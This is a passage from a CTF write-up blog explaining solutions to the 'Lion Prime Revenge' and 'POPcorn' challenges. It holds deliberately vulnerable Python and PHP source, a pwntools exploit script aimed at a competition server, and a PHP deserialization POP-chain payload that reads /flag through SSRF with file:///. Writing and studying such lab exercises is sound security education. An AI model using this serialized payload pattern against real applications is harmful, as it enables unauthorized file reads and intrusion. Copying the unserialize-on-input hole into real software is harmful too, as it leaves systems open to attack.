<p>The first part of the challenge is to deceive my lion_prime function (which is doing Miller-Rabin primality test) by giving three factors(f1, f2, f3 and <code>f1*f2*f3==p</code>), though I blocked the use of 1, I didn’t block -1…(Thanks a lot for telling me @eggroll(OAAAO))  </p>
<p>After that, is easy to see that if the logs array is only [0], it would pass the checker function 100%<br>So the exploitation was just like…<br>Keep trying until the oops value is a prime-&gt;<br>Input factors -1, -1, oops-&gt;<br>Enter 0 and get flag…  </p>
<h2 id="Lion-Prime-Revenge"><a href="#Lion-Prime-Revenge" class="headerlink" title="Lion Prime Revenge"></a>Lion Prime Revenge</h2><p><strong>Source Code:</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">banner=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Something not important</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params">datas</span>):</span><br><span class="line">    mul=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> datas:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            mul*=i</span><br><span class="line">            <span class="built_in">str</span>(mul)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mul&gt;= <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">64</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lion_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1337</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(random.randrange(<span class="number">1</span>, n), n - <span class="number">1</span>, n) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checker</span>(<span class="params">datas</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> patch(datas) <span class="keyword">or</span> <span class="built_in">len</span>(datas)==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Error detected&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    x=np.array(datas[:<span class="number">60</span>]).prod()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pow</span>(<span class="number">5</span>, x)-<span class="built_in">pow</span>(<span class="number">3</span>, x))%(<span class="built_in">pow</span>(<span class="number">2</span>, x)+<span class="number">115</span>)==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;NHNC&#123;FAKE_FLAG&#125;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;The cutest lion doesn\&#x27;t like your logs...&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    logs=[]</span><br><span class="line">    oops=random.randint(<span class="number">1</span>, <span class="number">2</span>**<span class="number">64</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Oops: <span class="subst">&#123;oops&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Input your number to check if it&#x27;s a Lion Prime: &quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> p==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> lion_prime(p):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;This is a Lion Prime, prove me wrong !!!&quot;</span>)</span><br><span class="line">            cur=[]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">                cur.append(<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">f&quot;Factor <span class="subst">&#123;i&#125;</span>: &quot;</span>)))</span><br><span class="line">                <span class="keyword">if</span> cur[i-<span class="number">1</span>]&lt;=<span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Invalid Factor!!!&quot;</span>)</span><br><span class="line">                    exit()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> cur[<span class="number">0</span>]*cur[<span class="number">1</span>]*cur[<span class="number">2</span>]==p:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;OK, I&#x27;ll report the issue&quot;</span>)</span><br><span class="line">                logs.append(p^oops)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;WA / 0&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;This is not a Lion Prime QwQ...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(logs)!=<span class="built_in">len</span>(<span class="built_in">set</span>(logs)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Collision!!!&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">        </span><br><span class="line">    checker(logs)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>The only change is the input check for factors:  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if cur[i-1]&lt;=1:</span><br></pre></td></tr></table></figure>
<p>Nah, preventing UNINTENDED solution up there…  </p>
<h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1."></a>Step 1.</h3><p>Ok, first of all, is well known it’s possible to bypass Miller-Rabin test by using Charmichael Number:<br><a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/12776/is-it-possible-to-fool-miller-rabin-test">https://crypto.stackexchange.com/questions/12776/is-it-possible-to-fool-miller-rabin-test</a>  </p>
<p>About how to generate them:<br><a target="_blank" rel="noopener" href="https://math.stackexchange.com/questions/2295095/what-is-the-fastest-way-to-get-the-next-carmichael-number">https://math.stackexchange.com/questions/2295095/what-is-the-fastest-way-to-get-the-next-carmichael-number</a>  </p>
<p>Ok, now you can find a bunch of pseuodo primes to deceive the lion_prime tester…  </p>
<h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2."></a>Step 2.</h3><p>Take a look at checker function, the x value should pass this:  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">pow</span>(<span class="number">5</span>, x)-<span class="built_in">pow</span>(<span class="number">3</span>, x))%(<span class="built_in">pow</span>(<span class="number">2</span>, x)+<span class="number">115</span>)==<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>This equaltion won’t satisfy unless x&#x3D;&#x3D;0, I’m not going to do the math since it’s not necessary for this challenge (<del>proof by getting the flag</del>).<br>But their’s a similar and detail proof here: <a target="_blank" rel="noopener" href="https://artofproblemsolving.com/community/c6h3107338p28104291">https://artofproblemsolving.com/community/c6h3107338p28104291</a>  </p>
<p>But how can the x be 0 since it’s multipled by some fake primes…<br><del>Wait until it’s a pseuodo prime would be a good choice but a long time lasting work</del>  </p>
<h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3."></a>Step 3.</h3><p>OVERFLOW, the max long int size in numpy is 64 bits, and in python3, the max length for an int type variable is 4300…  </p>
<p>Bypass <code>patch</code> function: 4300 digits overflow,<br>Make <code>x=np.array(datas[:60]).prod()</code> become 0: just make the value modulus 2^64&#x3D;&#x3D;0  </p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit!!!"></a>Exploit!!!</h3><p>My method is generate some pseuodo primes which is not large(to make it faster in multiplication in numpy) first, and then generate some bigger one:<br><strong>Generator.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> chal <span class="keyword">import</span> lion_prime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">payloads=[]</span><br><span class="line">primes=[]</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;payloads.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    k=random.randrange(<span class="number">2</span>**<span class="number">13</span>, <span class="number">2</span>**<span class="number">15</span>)</span><br><span class="line">    <span class="keyword">if</span> isPrime(<span class="number">6</span>*k+<span class="number">1</span>) <span class="keyword">and</span> isPrime(<span class="number">12</span>*k+<span class="number">1</span>) <span class="keyword">and</span> isPrime(<span class="number">18</span>*k+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;cnt+<span class="number">1</span>&#125;</span>&quot;</span>)   </span><br><span class="line">        <span class="keyword">if</span> lion_prime((<span class="number">6</span>*k+<span class="number">1</span>)*(<span class="number">12</span>*k+<span class="number">1</span>)*(<span class="number">18</span>*k+<span class="number">1</span>)) <span class="keyword">and</span> (<span class="number">6</span>*k+<span class="number">1</span>)*(<span class="number">12</span>*k+<span class="number">1</span>)*(<span class="number">18</span>*k+<span class="number">1</span>) <span class="keyword">not</span> <span class="keyword">in</span> primes:</span><br><span class="line">            primes.append((<span class="number">6</span>*k+<span class="number">1</span>)*(<span class="number">12</span>*k+<span class="number">1</span>)*(<span class="number">18</span>*k+<span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found\np: <span class="subst">&#123;(<span class="number">6</span>*k+<span class="number">1</span>)*(<span class="number">12</span>*k+<span class="number">1</span>)*(<span class="number">18</span>*k+<span class="number">1</span>)&#125;</span>\nFactors:<span class="subst">&#123;[(<span class="number">6</span>*k+<span class="number">1</span>), (<span class="number">12</span>*k+<span class="number">1</span>), (<span class="number">18</span>*k+<span class="number">1</span>)]&#125;</span>&quot;</span>)</span><br><span class="line">            payloads.append(&#123;<span class="string">&#x27;p&#x27;</span>:(<span class="number">6</span>*k+<span class="number">1</span>)*(<span class="number">12</span>*k+<span class="number">1</span>)*(<span class="number">18</span>*k+<span class="number">1</span>), <span class="string">&#x27;f&#x27;</span>:[(<span class="number">6</span>*k+<span class="number">1</span>), (<span class="number">12</span>*k+<span class="number">1</span>), (<span class="number">18</span>*k+<span class="number">1</span>)]&#125;)</span><br><span class="line">            cnt+=<span class="number">1</span>  </span><br><span class="line">        <span class="keyword">if</span> cnt&gt;=<span class="number">64</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    k=random.randrange(<span class="number">2</span>**<span class="number">59</span>, <span class="number">2</span>**<span class="number">60</span>)</span><br><span class="line">    <span class="keyword">if</span> isPrime(<span class="number">6</span>*k+<span class="number">1</span>) <span class="keyword">and</span> isPrime(<span class="number">12</span>*k+<span class="number">1</span>) <span class="keyword">and</span> isPrime(<span class="number">18</span>*k+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;cnt+<span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> lion_prime((<span class="number">6</span>*k+<span class="number">1</span>)*(<span class="number">12</span>*k+<span class="number">1</span>)*(<span class="number">18</span>*k+<span class="number">1</span>)) <span class="keyword">and</span> (<span class="number">6</span>*k+<span class="number">1</span>)*(<span class="number">12</span>*k+<span class="number">1</span>)*(<span class="number">18</span>*k+<span class="number">1</span>) <span class="keyword">not</span> <span class="keyword">in</span> primes:</span><br><span class="line">            primes.append((<span class="number">6</span>*k+<span class="number">1</span>)*(<span class="number">12</span>*k+<span class="number">1</span>)*(<span class="number">18</span>*k+<span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found\np: <span class="subst">&#123;(<span class="number">6</span>*k+<span class="number">1</span>)*(<span class="number">12</span>*k+<span class="number">1</span>)*(<span class="number">18</span>*k+<span class="number">1</span>)&#125;</span>\nFactors:<span class="subst">&#123;[(<span class="number">6</span>*k+<span class="number">1</span>), (<span class="number">12</span>*k+<span class="number">1</span>), (<span class="number">18</span>*k+<span class="number">1</span>)]&#125;</span>&quot;</span>)</span><br><span class="line">            payloads.append(&#123;<span class="string">&#x27;p&#x27;</span>:(<span class="number">6</span>*k+<span class="number">1</span>)*(<span class="number">12</span>*k+<span class="number">1</span>)*(<span class="number">18</span>*k+<span class="number">1</span>), <span class="string">&#x27;f&#x27;</span>:[(<span class="number">6</span>*k+<span class="number">1</span>), (<span class="number">12</span>*k+<span class="number">1</span>), (<span class="number">18</span>*k+<span class="number">1</span>)]&#125;)</span><br><span class="line">            cnt+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> cnt&gt;=<span class="number">150</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">json.dump(payloads, f)</span><br></pre></td></tr></table></figure>

<p><strong>Exploit.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">r=remote(<span class="string">&#x27;23.146.248.134&#x27;</span>, <span class="number">11116</span>)</span><br><span class="line"><span class="comment"># r=remote(&#x27;0.0.0.0&#x27;, 9999)</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;payloads.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">payloads=json.load(f)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Lion Prime Checker&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;Oops&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pd <span class="keyword">in</span> tqdm(payloads):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(pd[<span class="string">&#x27;p&#x27;</span>]).encode())</span><br><span class="line"><span class="comment">#    sleep(0.3)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(pd[<span class="string">&#x27;f&#x27;</span>][i]).encode())</span><br><span class="line"><span class="comment">#        sleep(0.1)</span></span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>wait until the oops value is an odd one, and run the script to get flag!<br><img src="https://hackmd.io/_uploads/BJWDfKDz1l.png" alt="image">  </p>
<h2 id="POPcorn"><a href="#POPcorn" class="headerlink" title="POPcorn"></a>POPcorn</h2><p>POP Chain: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/deserialization/exploiting#creating-your-own-exploit">https://portswigger.net/web-security/deserialization/exploiting#creating-your-own-exploit</a><br>You can learn from the starting point if you haven’t learned about serialization vulnerabilities.  </p>
<blockquote>
<p>The flag is in &#x2F;flag  </p>
</blockquote>
<p>The main source part:  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WHALE</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$report_uri</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;report_uri = <span class="variable">$report_uri</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$obj</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$this</span>-&gt;report_uri);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NHNC&#123;FAKE_FLAG&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MEOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cat_struct</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;id = <span class="variable">$cat_struct</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;id-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span>     <span class="variable language_">$this</span>-&gt;id-&gt;r3a1_name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;serialized &gt;w&lt;b, but I want to sleep :zzz:&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TEST</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$note</span>, <span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;note = <span class="variable">$note</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;pwned&#x27;</span>, <span class="variable">$this</span>-&gt;url))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo `date` &gt;&gt; log.txt&#x27;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>The POP Chain:<br>Trigger the chain by <code>__destruct</code> method in TEST -&gt;<br>Using the preg_match function to call <code>__toString</code> in MEOW -&gt;<br>Trigger <code>__get</code> in WHALE by <code>$this-&gt;id-&gt;r3a1_name</code> in the previous <code>__toString</code><br>Finally, SSRF in this part:  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$obj</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$this</span>-&gt;report_uri);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>curl file:///flag</code> can get flag!  </p>
<p><strong>Exploit.php</strong>  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WHALE</span></span>&#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TEST</span></span>&#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MEOW</span></span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload1</span>=<span class="keyword">new</span> WHALE;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload1</span>-&gt;report_uri=<span class="string">&#x27;file:///flag&#x27;</span>;</span><br><span class="line"><span class="variable">$payload2</span>=<span class="keyword">new</span> MEOW;</span><br><span class="line"><span class="variable">$payload2</span>-&gt;id=<span class="variable">$payload1</span>;</span><br><span class="line"><span class="variable">$payload3</span>=<span class="keyword">new</span> TEST;</span><br><span class="line"><span class="variable">$payload3</span>-&gt;url=<span class="variable">$payload2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Full Exploit: &#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload3</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>meow~  </p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
